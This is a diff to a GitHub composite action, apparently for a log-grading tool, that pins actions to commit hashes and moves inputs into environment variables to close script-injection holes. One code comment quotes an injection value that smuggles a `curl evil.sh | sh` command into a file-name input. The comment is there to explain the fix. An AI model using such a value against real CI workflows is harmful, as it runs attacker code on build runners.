@@ -52,7 +52,7 @@ runs:
   using: "composite"
   steps:
     - name: Set up Python
-      uses: actions/setup-python@v5
+      uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v5
       with:
         python-version: ${{ inputs.python-version }}
 
@@ -63,13 +63,21 @@ runs:
     - name: Parse log file
       id: parse
       shell: bash
+      # Inputs arrive through env, never through ${{ }} inside `run:`. GitHub
+      # substitutes an expression into the script *before* bash sees it, so a
+      # log-file value of `x"; curl evil.sh | sh; "` would run in the runner —
+      # and callers routinely wire these inputs to PR titles and branch names.
+      # As an env var the value is data to bash, whatever it contains.
+      env:
+        INPUT_TASK: ${{ inputs.task }}
+        INPUT_LOG_FILE: ${{ inputs.log-file }}
       run: |
-        TASK_ARG=""
-        if [ "${{ inputs.task }}" != "auto" ]; then
-          TASK_ARG="--task ${{ inputs.task }}"
+        TASK_ARGS=()
+        if [ "$INPUT_TASK" != "auto" ]; then
+          TASK_ARGS=(--task "$INPUT_TASK")
         fi
 
-        OUTPUT=$(epochix batch "${{ inputs.log-file }}" $TASK_ARG \
+        OUTPUT=$(epochix batch "$INPUT_LOG_FILE" "${TASK_ARGS[@]}" \
           --json --headless 2>&1)
 
         RUN_ID=$(echo "$OUTPUT" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['id'])")
@@ -84,9 +92,12 @@ runs:
     - name: Export reports
       id: export
       shell: bash
+      # Same rule for step outputs: run-id is derived from the parsed log, so
+      # it is untrusted for the same reason the log file is.
+      env:
+        RUN_ID: ${{ steps.parse.outputs.run-id }}
+        EXPORTS: ${{ inputs.export }}
       run: |
-        RUN_ID="${{ steps.parse.outputs.run-id }}"
-        EXPORTS="${{ inputs.export }}"
         HTML_PATH=""
         MD_PATH=""
 
@@ -106,7 +117,7 @@ runs:
         echo "md-path=$MD_PATH" >> "$GITHUB_OUTPUT"
 
     - name: Upload artifact
-      uses: actions/upload-artifact@v4
+      uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
       with:
         name: ${{ inputs.artifact-name }}
         path: |
@@ -120,15 +131,21 @@ runs:
         inputs.comment-on-pr == 'true' &&
         github.event_name == 'pull_request' &&
         steps.export.outputs.md-path != ''
-      uses: actions/github-script@v7
+      uses: actions/github-script@f28e40c7f34bde8b3046d885e986cb6290c5673b # v7
+      # Interpolating into `script:` is the same hazard as interpolating into
+      # `run:` — the expression is substituted before Node parses the source,
+      # so a grade or path containing a backtick or quote becomes JavaScript.
+      env:
+        MD_PATH: ${{ steps.export.outputs.md-path }}
+        GRADE: ${{ steps.parse.outputs.grade }}
       with:
         script: |
           const fs = require('fs');
-          const mdPath = '${{ steps.export.outputs.md-path }}';
-          if (!fs.existsSync(mdPath)) { return; }
+          const mdPath = process.env.MD_PATH;
+          if (!mdPath || !fs.existsSync(mdPath)) { return; }
 
           const body = fs.readFileSync(mdPath, 'utf8');
-          const header = `## 📊 Epochix — Grade: ${{ steps.parse.outputs.grade }}\n\n`;
+          const header = `## 📊 Epochix — Grade: ${process.env.GRADE}\n\n`;
 
           await github.rest.issues.createComment({
             owner: context.repo.owner,
